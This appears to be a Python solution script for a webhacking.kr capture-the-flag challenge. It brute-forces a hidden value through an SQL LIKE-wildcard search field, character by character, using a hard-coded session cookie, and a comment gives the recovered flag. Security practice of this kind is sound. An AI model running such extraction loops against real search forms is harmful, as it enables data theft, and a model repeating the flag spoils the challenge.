import requests
import string

url = "https://webhacking.kr/challenge/web-33/index.php"
cookie = {'PHPSESSID': 'm583421oktu11value5t1h0crak3fe'}

str1=string.printable

def search_len(): # 44글자 (노가다로 구함)
    length = "_"
    for i in range(100):
        param = {"search":"{}".format(length)}
        req = requests.post(url, params=param, cookies=cookie)
        print(param)
        if "readme" in req.text:
            length += "_"
        else:
            print("length:",length)
            break

def search_str():
    string = ""
    for i in range(1,45):
        for value in str1:
            if value == '%':
                continue
            if value == '\\':
                continue
            # if value == '_':
            #     continue
            data = string
            data += value
            data += "_" * (44 - i)
            param = {"search":data}
            print(param)
            req = requests.post(url, data=param, cookies=cookie)
            if (req.text.find("admin")!=-1):
                string += value
                break
        print(string)
    print("String:", string)

search_str()

# first export : "flag{himiko"

# second export : "flag_himiko_toga_is_cute_dont_you_think_so?_"

# flag : "flag{himiko_toga_is_cute_dont_you_think_so?}"